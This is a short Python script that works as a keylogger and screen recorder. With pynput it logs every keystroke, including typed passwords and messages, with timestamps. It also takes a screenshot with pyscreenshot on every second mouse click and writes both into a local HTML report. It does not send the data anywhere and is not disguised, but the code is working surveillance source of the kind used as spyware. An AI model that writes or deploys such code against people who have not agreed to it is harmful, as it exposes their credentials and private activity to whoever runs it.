import datetime
import time
import sys
import pyscreenshot
from pynput.keyboard import Listener as  KeyboardListener
from pynput import keyboard
from pynput.mouse import Listener as  MouseListener
from pynput import mouse

histories = []
open("output.html", "w").close()
head = '<!DOCTYPE html><html lang="en"><head><title>Output</title><meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"/><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script><script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script></head><body  style="background-color: black; color: white"><div class="container">'

def onPress(key):
    if key == keyboard.Key.esc:
        with open("output.html", "a") as file:
            file.write(head)
            file.write("<h2>User Events</h2>")
            file.writelines(histories)
            file.write("</div></body></html>")
            
        return False
    try: 
        histories.append("<p><b>" + str(datetime.datetime.now().time()).split(".")[:-1][0] + "</b>" + " - " + str(key.char) + "<br></p>")
    except AttributeError:
        histories.append("<p><b>" + str(datetime.datetime.now().time()).split(".")[:-1][0] + "</b>" + " - " + str(key.name) + "<br></p>")


btn = 0

def onClick(x, y, button, pressed, dispatch=True):
    if not dispatch:
        return False
    global btn
    btn += 1
    if btn == 2:
        time.sleep(0.5)
        image = pyscreenshot.grab()
        imgsec = str(datetime.datetime.now().time()).split(".")[:-1][0].replace(":", "-") + ".png"
        image.save(imgsec)
        histories.append('<img src="' + imgsec + '"class="img-fluid" />')
        btn = 0

keyboard_listener = KeyboardListener(on_press=onPress)
keyboard_listener.start()

with mouse.Listener(on_click=onClick) as mouseListener:
    mouseListener.join()